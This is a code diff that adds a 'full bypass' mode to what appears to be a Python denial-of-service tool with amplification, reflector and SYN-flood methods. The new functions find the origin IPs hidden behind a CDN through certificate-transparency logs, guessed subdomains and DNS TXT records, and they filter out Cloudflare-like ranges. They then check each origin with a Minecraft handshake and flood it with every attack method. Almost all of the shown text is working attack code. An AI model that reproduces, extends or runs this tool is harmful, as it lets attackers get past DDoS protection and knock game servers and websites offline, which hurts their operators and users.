@@ -659,6 +659,94 @@ AMP_METHODS = {
 #  MAIN
 # ============================================================
 STOP = None
+
+# ============================================================
+#  FULL BYPASS — discover origin + verify + flood
+# ============================================================
+
+def discover_origin(domain):
+    origins = set()
+    try:
+        import urllib.request, json
+        url = f"https://crt.sh/?q=%25.{domain}&output=json"
+        data = json.loads(urllib.request.urlopen(url, timeout=15).read())
+        for cert in data:
+            name = cert.get("name_value", "")
+            for line in name.split("\n"):
+                line = line.strip().lstrip("*.")
+                if line and domain in line:
+                    try:
+                        ip = socket.gethostbyname(line.split()[0])
+                        if ip and not ip.startswith("104.") and not ip.startswith("172.6"):
+                            origins.add(ip)
+                    except Exception:
+                        pass
+    except Exception as e:
+        print(f"  crt.sh failed: {e}")
+    for sub in ["origin", "direct", "backend", "api", "mail", "ftp", "cpanel", "webmail", "mc", "play"]:
+        try:
+            ip = socket.gethostbyname(f"{sub}.{domain}")
+            if ip and not ip.startswith("104.") and not ip.startswith("172.6"):
+                origins.add(ip)
+        except Exception:
+            pass
+    try:
+        import subprocess
+        out = subprocess.check_output(["dig", "+short", "TXT", domain], text=True, timeout=10)
+        for ip in re.findall(r"\d+\.\d+\.\d+\.\d+", out):
+            origins.add(ip)
+    except Exception:
+        pass
+    print(f"  found origins: {origins}")
+    return list(origins)
+
+async def full_bypass(domain, port, duration, conns, methods):
+    """End-to-end: discover origin → verify → flood with all methods."""
+    print(f"[*] FULL BYPASS for {domain}")
+    # 1. discover origin
+    origins = discover_origin(domain)
+    if not origins:
+        print("  no origin found via auto-discovery, trying common patterns")
+        origins = [domain]
+    # 2. verify each origin
+    verified = []
+    for ip in origins:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((ip, port))
+            # send MC handshake to verify
+            hs = mc_handshake_packet(domain, port, 765, 1)
+            s.send(hs + mc_status_request())
+            data = s.recv(1024)
+            s.close()
+            if data and (b"motd" in data.lower() or b"players" in data.lower() or len(data) > 10):
+                print(f"  [+] VERIFIED origin: {ip} (MC server responding)")
+                verified.append(ip)
+            else:
+                print(f"  [-] {ip} not responding as MC server")
+        except Exception as e:
+            print(f"  [-] {ip} connection failed: {e}")
+    if not verified:
+        print("  no verified origins — flooding all discovered IPs")
+        verified = origins
+    # 3. flood each verified origin with all methods
+    for ip in verified:
+        print(f"\n[*] FLOODING ORIGIN {ip}:{port}")
+        tasks = []
+        for m in methods:
+            if m in AMP_METHODS:
+                continue
+            fn = METHODS[m]
+            tasks.append(asyncio.create_task(fn(ip, port, False, duration, conns)))
+        # also syn flood
+        tasks.append(asyncio.create_task(syn_flood(ip, port, duration, conns)))
+        await asyncio.gather(*tasks, return_exceptions=True)
+        async with LOCK:
+            s, e, b = STATS["sent"], STATS["errs"], STATS["bytes"]
+        print(f"  origin {ip}: sent={s} errs={e} bytes={b/1e6:.1f}MB")
+    return verified
+
 async def main():
     global STOP, LOCK
     STOP = asyncio.Event() if False else None
@@ -678,6 +766,7 @@ async def main():
     ap.add_argument("--payload", type=int, default=1400)
     ap.add_argument("--mc-mode", default="status", choices=["status", "login", "ping"])
     ap.add_argument("--confirm", action="store_true")
+    ap.add_argument("--bypass", action="store_true", help="full bypass: discover origin + verify + flood")
     args = ap.parse_args()
 
     if not args.confirm:
@@ -696,6 +785,9 @@ async def main():
 
     print(f"target={args.target} port={port} conns={args.conns} duration={args.duration}s "
           f"methods={args.methods} ssl={args.ssl} reflectors={len(reflectors)}")
+    if args.bypass:
+        await full_bypass(args.target, port, args.duration, args.conns, args.methods)
+        return
 
     tasks = []
     for m in args.methods:
